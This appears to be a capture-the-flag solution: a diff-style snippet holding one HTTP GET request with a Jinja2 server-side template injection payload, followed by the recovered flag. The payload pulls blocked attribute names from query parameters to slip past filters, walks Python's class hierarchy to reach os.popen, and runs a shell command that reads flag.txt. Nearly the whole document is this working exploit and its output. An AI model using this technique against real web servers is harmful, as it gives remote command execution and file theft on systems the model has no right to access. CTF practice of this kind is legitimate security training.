@@ -1,0 +1,3 @@
+GET /submit?value={{{}|attr(request|attr("args")|list|attr("pop")(3))|attr(request|attr("args")|list|attr("pop")(2))|attr(request|attr("args")|list|attr("pop")(0))()|attr("pop")(258)|attr(request|attr("args")|list|attr("pop")(7))|attr(request|attr("args")|list|attr("pop")(5))|attr("pop")(request|attr("args")|list|attr("pop")(6))|attr("popen")("cat+flag.txt")|attr("read")()}}&__class__=&__base__=&__subclasses__=&__init__=&__globals__=&__builtins__=&os= HTTP/1.1
+
+flag{m0mmy_s33_1m_4_r34l_n1nj4}
